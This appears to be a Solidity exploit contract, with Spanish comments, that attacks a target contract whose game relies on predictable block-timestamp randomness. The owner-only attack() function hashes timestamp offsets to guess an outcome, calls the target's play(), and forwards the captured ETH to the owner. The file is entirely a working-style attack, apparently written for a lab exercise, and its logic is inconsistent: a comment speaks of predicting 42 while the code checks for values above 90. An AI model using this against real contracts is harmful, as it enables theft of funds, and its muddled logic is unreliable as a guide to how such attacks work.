// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IInsecure {
    function play(uint256 i) external;
}

contract InsecureRandomnessAttack {
    IInsecure public target;
    address public owner;

    constructor(address _targetAddress) {
        target = IInsecure(_targetAddress);
        owner = msg.sender;
    }

    function attack() public {
        require(msg.sender == owner, "Not owner");
        // Intentamos encontrar el momento exacto donde se predice el 42
        for (uint256 i = 0; i < 100; i++) {
        uint256 fakeRandom = uint256(keccak256(abi.encodePacked(block.timestamp+i, msg.sender))) % 100;
            
            if (fakeRandom > 90) {
                target.play(i);
                payable(owner).transfer(address(this).balance);
                break;
            }
        }
    }

    // Permite recibir ETH del contrato vulnerable
    receive() external payable {}
}